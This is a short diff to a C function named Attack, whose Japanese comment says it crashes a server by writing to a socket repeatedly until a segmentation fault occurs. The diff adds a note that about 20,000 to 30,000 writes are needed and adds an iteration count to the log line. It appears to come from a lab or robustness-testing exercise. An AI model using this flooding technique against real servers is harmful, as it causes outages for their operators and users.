@@ -149,6 +149,7 @@ void Attack (const int fd) {
     /*
     サーバーを落とすための関数。
     連続で複数回writeすることでsegmentation faultを引き起こす
+    平均20000~30000回のwriteで落ちる模様
     */
 
     uint32_t tmp;
@@ -161,7 +162,7 @@ void Attack (const int fd) {
       while (len == -1) {
         len = write(fd, &tmp, sizeof(tmp));
       }
-      printf("Attacking %d byte\n", len);
+      printf("%d th time: Attacking %d byte\n", i, len);
     }
 
 }
